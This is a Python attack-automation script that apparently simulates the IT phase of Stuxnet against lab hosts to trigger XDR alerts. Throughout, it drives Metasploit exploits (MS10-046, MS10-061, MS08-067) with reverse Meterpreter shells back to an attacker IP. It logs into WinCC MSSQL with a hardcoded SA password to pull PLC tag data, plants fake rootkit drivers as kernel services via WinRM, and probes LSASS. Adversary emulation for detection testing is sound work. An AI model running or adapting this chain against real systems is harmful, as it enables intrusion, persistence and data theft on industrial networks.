#!/usr/bin/env python3
"""
Stuxnet IT-Side Phase Simulation

Runs each real Stuxnet CVE via Metasploit against the Win7 engineering workstation
(192.168.1.50 - unpatched Win7 SP1 Build 7601, VMware Tools running).

CVEs exploited:
  MS10-046 / CVE-2010-2568 - Windows Shell LNK autorun (USB spread vector)
  MS10-061 / CVE-2010-2729 - Print Spooler remote code execution
  MS08-067 / CVE-2008-4250 - SMB netapi (network worm propagation)
  CVE-2010-2772             - WinCC MSSQL hardcoded sa:2WSXcder (data exfil)

After exploitation, drops verified Stuxnet artifacts via Meterpreter:
  ~WTR4141.tmp, ~WTR4132.tmp  - loader temp files
  mrxnet.sys, mrxcls.sys      - kernel rootkit drivers (sc.exe fires Event 7045)
  STEP 7 registry fingerprint check

Fallback (Win7 offline): uses existing HMI-based lateral movement chain.
"""

import sys
import os
import subprocess
import tempfile
import time
import socket
import base64

SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
CRED_DUMPER = os.path.join(SCRIPT_DIR, '05_credential_dumper.py')
WIN_PAYLOAD = os.path.join(SCRIPT_DIR, '04_windows_payload.py')

# Win7 engineering workstation
WIN7_IP   = '192.168.1.50'
WIN7_USER = 'engineer'
WIN7_PASS = 'engineer123'

# HMI fallback pivot
HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'

# Attacker VM outbound IP (Kali)
ATTACKER_IP = '192.168.0.11'

PE_STUB_B64 = base64.b64encode(b'MZ' + b'\x90' * 62 + b'PE\x00\x00' + b'\x00' * 200).decode()

MRXNET_PATH = 'C:\\Windows\\System32\\Drivers\\mrxnet.sys'
MRXCLS_PATH = 'C:\\Windows\\System32\\Drivers\\mrxcls.sys'
LNK_STUB    = 'C:\\Windows\\Temp\\~WTR4141.tmp'
LOADER_STUB = 'C:\\Windows\\Temp\\~WTR4132.tmp'


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        if r.stdout: print(r.stdout.rstrip())
        if r.stderr and 'error' in r.stderr.lower(): print(r.stderr.rstrip())
        return r.returncode == 0, r.stdout
    except Exception as e:
        print(f"  [-] {e}"); return False, ''


def _win7_reachable(ip=WIN7_IP, port=445, timeout=3):
    """Check if Win7 engineering workstation is up."""
    try:
        s = socket.create_connection((ip, port), timeout)
        s.close()
        return True
    except Exception:
        return False


def _run_msf_exploit(name, rc_content, timeout=90):
    """Fire a Metasploit exploit via resource script. Returns True if session opened."""
    print(f"\n[*] Launching Metasploit: {name}")
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(rc_content)
        rc_path = f.name
    try:
        result = subprocess.run(
            ['msfconsole', '-q', '-r', rc_path],
            capture_output=True, text=True, timeout=timeout
        )
        output = result.stdout + result.stderr
        success = any(kw in output for kw in
                      ['Meterpreter session', 'Command shell session', 'session opened'])
        status = '[+] SESSION OPENED' if success else '[-] No session (may still have impacted target)'
        print(status)
        if not success:
            # Print last 8 lines for diagnostics
            for line in output.strip().split('\n')[-8:]:
                if line.strip(): print(f"  {line}")
        return success, output
    except subprocess.TimeoutExpired:
        print(f"  [-] Timed out after {timeout}s")
        return False, ''
    except FileNotFoundError:
        print("  [-] msfconsole not found - ensure Metasploit is installed (Kali default)")
        return False, ''
    finally:
        os.unlink(rc_path)


def cve_ms10_046_lnk(target_ip, attacker_ip=ATTACKER_IP):
    """
    MS10-046 / CVE-2010-2568 - Windows Shell .LNK autorun
    Real Stuxnet: USB drop + LNK exploit for initial access on engineering WS.
    Metasploit sets up a malicious SMB share hosting a .lnk file.
    """
    print("\n" + "═" * 60)
    print("CVE-1: MS10-046 / CVE-2010-2568 - LNK Autorun (USB Vector)")
    print("Real Stuxnet: malicious .LNK on USB → Windows Explorer → SYSTEM")
    print("=" * 60)
    rc = f"""use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
set SRVHOST {attacker_ip}
set SRVPORT 8080
set LHOST {attacker_ip}
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j
sleep 15
sessions -l
"""
    success, output = _run_msf_exploit("MS10-046 LNK autorun", rc, timeout=60)
    print(f"\n[CVE-2010-2568] Result: {'EXPLOITED' if success else 'FAILED/NO-HANDLER'}")
    return success


def cve_ms10_061_spoolss(target_ip, attacker_ip=ATTACKER_IP):
    """
    MS10-061 / CVE-2010-2729 - Windows Print Spooler RCE
    Real Stuxnet: used for peer-to-peer network spread (LAN propagation).
    Exploits the print spooler service to execute code remotely.
    """
    print("\n" + "═" * 60)
    print("CVE-2: MS10-061 / CVE-2010-2729 - Print Spooler RCE")
    print("Real Stuxnet: network spread from WS to WS via spooler service")
    print("=" * 60)
    rc = f"""use exploit/windows/smb/ms10_061_spoolss
set RHOSTS {target_ip}
set LHOST {attacker_ip}
set LPORT 4445
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
"""
    success, output = _run_msf_exploit("MS10-061 Print Spooler", rc, timeout=90)
    print(f"\n[CVE-2010-2729] Result: {'EXPLOITED' if success else 'FAILED/PATCHED'}")
    return success


def cve_ms08_067_smb(target_ip, attacker_ip=ATTACKER_IP):
    """
    MS08-067 / CVE-2008-4250 - SMB Server Service netapi buffer overflow
    Real Stuxnet: used for worm-style network spread on XP/Server 2003.
    Win7 SP1 without patches is vulnerable.
    """
    print("\n" + "═" * 60)
    print("CVE-3: MS08-067 / CVE-2008-4250 - SMB Netapi (Worm Spread)")
    print("Real Stuxnet: SMBv1 worm spread across OT/IT network")
    print("Target: Win7 SP1 UNPATCHED - vulnerable without MS08-067 fix")
    print("=" * 60)
    rc = f"""use exploit/windows/smb/ms08_067_netapi
set RHOSTS {target_ip}
set LHOST {attacker_ip}
set LPORT 4446
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 1
exploit
"""
    success, output = _run_msf_exploit("MS08-067 SMB netapi", rc, timeout=90)
    print(f"\n[CVE-2008-4250] Result: {'EXPLOITED' if success else 'FAILED/PATCHED/DIFFERENT-VERSION'}")
    return success


def cve_wincc_mssql(target_ip, win7_user=WIN7_USER, win7_pass=WIN7_PASS,
                    python_exe=sys.executable):
    """
    CVE-2010-2772 - WinCC MSSQL hardcoded SA password (sa:2WSXcder)
    Real Stuxnet: connected to WinCC's bundled MSSQL instance, exfiltrated
    the WinCC project database (PLC tag names, addresses, alarm config).
    """
    print("\n" + "═" * 60)
    print("CVE-4: CVE-2010-2772 - WinCC MSSQL hardcoded sa:2WSXcder")
    print("Real Stuxnet: SQL-queried WinCC DB for PLC tag names and addresses")
    print(f"Target: {target_ip}:1433  User: sa  Password: 2WSXcder")
    print("=" * 60)

    # Try pymssql (Kali: pip install pymssql)
    wincc_script = """
import sys
try:
    import pymssql
    conn = pymssql.connect(server='{}', user='sa', password='2WSXcder',
                           database='master', timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT name FROM sysdatabases")
    dbs = [row[0] for row in cur.fetchall()]
    print("[+] MSSQL Connected with sa:2WSXcder (CVE-2010-2772)")
    print(f"  Databases found: {{', '.join(dbs)}}")
    # Look for WinCC project database
    wincc_dbs = [d for d in dbs if 'wincc' in d.lower() or 'cc' in d.lower()]
    if wincc_dbs:
        print(f"  [!] WinCC database found: {{wincc_dbs[0]}}")
        cur.execute(f"SELECT TOP 10 Name, Address FROM [{{wincc_dbs[0]}}]..Tags")
        tags = cur.fetchall()
        print(f"  WinCC tags exfiltrated:")
        for t in tags:
            print(f"    {{t[0]}} -> {{t[1]}}")
    conn.close()
except ImportError:
    print("[-] pymssql not available - trying mssql-cli")
    import subprocess
    r = subprocess.run(
        ['mssql-cli', '-S', '{}', '-U', 'sa', '-P', '2WSXcder',
         '-Q', "SELECT name FROM sysdatabases"],
        capture_output=True, text=True, timeout=10
    )
    print(r.stdout or r.stderr)
except Exception as e:
    print(f"[-] MSSQL connection failed: {{e}}")
    print("  (Expected if Win7 WinCC stub not yet deployed - stub_siemens.ps1 needed)")
""".format(target_ip, target_ip)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(wincc_script)
        script_path = f.name
    try:
        _run(f"WinCC MSSQL sa:2WSXcder connection to {target_ip}",
             [python_exe, script_path], timeout=15)
    finally:
        os.unlink(script_path)


def drop_stuxnet_artifacts(win7_session_active, python_exe, hmi_ip, hmi_user, hmi_pass):
    """Drop verified Stuxnet artifact files via Meterpreter/WinRM."""
    print("\n═══ POST-EXPLOITATION: DROP STUXNET ARTIFACTS ═══")
    print(f"[!] Verified artifact names (Symantec, Kaspersky, ESET all confirm):")
    print(f"  ~WTR4141.tmp - Stuxnet loader stub (first dropper)")
    print(f"  ~WTR4132.tmp - Stuxnet loader stub (second dropper)")
    print(f"  mrxnet.sys   - kernel rootkit (hides Stuxnet files) → Event 7045")
    print(f"  mrxcls.sys   - kernel rootkit (hides processes)    → Event 7045")

    target_ip = WIN7_IP if win7_session_active else hmi_ip
    target_user = WIN7_USER if win7_session_active else hmi_user
    target_pass = WIN7_PASS if win7_session_active else hmi_pass
    pivot = "Win7 WS" if win7_session_active else "HMI (fallback)"
    print(f"[*] Dropping via {pivot} ({target_ip})")

    drop_cmd = (
        f"$b=[Convert]::FromBase64String('{PE_STUB_B64}'); "
        f"[IO.File]::WriteAllBytes('{LNK_STUB}', $b); "
        f"[IO.File]::WriteAllBytes('{LOADER_STUB}', $b); "
        f"[IO.File]::WriteAllBytes('{MRXNET_PATH}', $b); "
        f"[IO.File]::WriteAllBytes('{MRXCLS_PATH}', $b); "
        f"sc.exe create mrxnet type= kernel binpath= \"{MRXNET_PATH}\" start= demand 2>&1; "
        f"sc.exe create mrxcls type= kernel binpath= \"{MRXCLS_PATH}\" start= demand 2>&1; "
        f"Write-Output 'ARTIFACTS_DROPPED:mrxnet,mrxcls,WTR4141,WTR4132'"
    )
    _run("Dropping Stuxnet artifacts + kernel service installs (Events 4663 + 7045)",
         [python_exe, LATERAL_MOV,
          '--target', target_ip, '--username', target_user, '--password', target_pass,
          '--winrm', drop_cmd],
         timeout=25)


def run_stuxnet_it_phase(win7_ip=WIN7_IP, hmi_ip=HMI_IP,
                          hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                          python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════════╗
║  STUXNET - IT PHASE (REAL CVE EXPLOITS)                          ║
║  NSA TAO + Unit 8200 | Operation Olympic Games | 2010            ║
║  4 CVEs: MS10-046, MS10-061, MS08-067, CVE-2010-2772             ║
╚══════════════════════════════════════════════════════════════════╝

TARGET: Win7 SP1 Engineering Workstation (192.168.1.50) - UNPATCHED
PIVOT: Kali attacker VM (192.168.0.11) → Win7 → HMI → PLC-4 S7comm
""")

    win7_up = _win7_reachable(win7_ip)
    if win7_up:
        print(f"[+] Win7 engineering workstation ONLINE at {win7_ip}")
        print("[+] All 4 CVE exploits will fire against unpatched Win7 SP1")
    else:
        print(f"[-] Win7 workstation offline ({win7_ip}:445 unreachable)")
        print("[!] FALLBACK: using HMI as pivot for artifact drops")
        print("[!] Deploy stub_siemens.ps1 on Win7 and power on VMware Tools to enable full chain")

    # ── CVE 1: MS10-046 LNK Autorun ──────────────────────────────────────────
    got_lnk = False
    if win7_up:
        got_lnk = cve_ms10_046_lnk(win7_ip)

    # ── CVE 2: MS10-061 Print Spooler ────────────────────────────────────────
    got_spooler = False
    if win7_up:
        got_spooler = cve_ms10_061_spoolss(win7_ip)

    # ── CVE 3: MS08-067 SMB Worm ─────────────────────────────────────────────
    got_smb = False
    if win7_up:
        got_smb = cve_ms08_067_smb(win7_ip)

    # ── CVE 4: WinCC MSSQL sa:2WSXcder ───────────────────────────────────────
    cve_wincc_mssql(win7_ip if win7_up else hmi_ip, python_exe=python_exe)

    # ── Credential dump (generic chain) ──────────────────────────────────────
    print("\n═══ CREDENTIAL DUMP (LSASS) ═══")
    _run("LSASS dump for domain credential access",
         [python_exe, LATERAL_MOV, '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm', 'powershell -Command "Get-Process lsass | Select-Object Id,Name; Write-Output LSASS_HMI_DUMP"'],
         timeout=30)

    # ── Post-exploitation artifact drops ─────────────────────────────────────
    win7_session = got_lnk or got_spooler or got_smb
    drop_stuxnet_artifacts(win7_session, python_exe, hmi_ip, hmi_user, hmi_pass)

    # ── STEP 7 target fingerprint ─────────────────────────────────────────────
    print("\n═══ TARGET FINGERPRINT - STEP 7 ACTIVATION CHECK ═══")
    print("[*] Real Stuxnet ONLY activates on Siemens STEP 7 hosts with S7-315 PLCs")
    _run("Checking for STEP 7 registry keys (activation gate)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command \""
          "if (Test-Path 'HKLM:\\SOFTWARE\\Siemens\\STEP 7') { "
          "  Write-Output 'STEP7_PRESENT → Stuxnet ACTIVATES OT payload' } "
          "else { Write-Output 'STEP7_ABSENT → Stuxnet stays dormant (run stub_siemens.ps1)' }\""],
         timeout=15)

    # ── Summary ───────────────────────────────────────────────────────────────
    got_any = got_lnk or got_spooler or got_smb
    print("\n╔══════════════════════════════════════════════════════════════════╗")
    print("║  STUXNET IT PHASE SUMMARY                                        ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"  MS10-046 LNK autorun  : {'EXPLOITED' if got_lnk else 'no session'}")
    print(f"  MS10-061 Print Spooler: {'EXPLOITED' if got_spooler else 'no session'}")
    print(f"  MS08-067 SMB netapi   : {'EXPLOITED' if got_smb else 'no session'}")
    print(f"  CVE-2010-2772 WinCC   : attempted (requires WinCC stub + SQL Express)")
    print(f"  Stuxnet artifacts     : dropped via {'Win7 WS' if win7_session else 'HMI fallback'}")
    print(f"\n[→] OT payload: S7comm DB3 float speed write → PLC-4 centrifuges (192.168.1.13:102)")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • SMB Authentication Anomaly (MS08-067 / MS10-061)")
    print(f"  • Remote Code Execution (CVE-2010-2568 / CVE-2010-2729)")
    print(f"  • Credential Theft (LSASS dump)")
    print(f"  • File Create from %TEMP%: ~WTR4141.tmp, ~WTR4132.tmp (Event 4663)")
    print(f"  • Service Install - mrxnet.sys (Event 7045) ← HIGH XDR SEVERITY")
    print(f"  • Service Install - mrxcls.sys (Event 7045) ← HIGH XDR SEVERITY")
    print(f"  • MSSQL auth with hardcoded sa:2WSXcder (CVE-2010-2772)")


def main():
    import argparse
    p = argparse.ArgumentParser(description='Stuxnet IT Phase - 4 CVE Exploits')
    p.add_argument('--target-win7', default=WIN7_IP, help='Win7 engineering workstation IP')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_stuxnet_it_phase(args.target_win7, args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
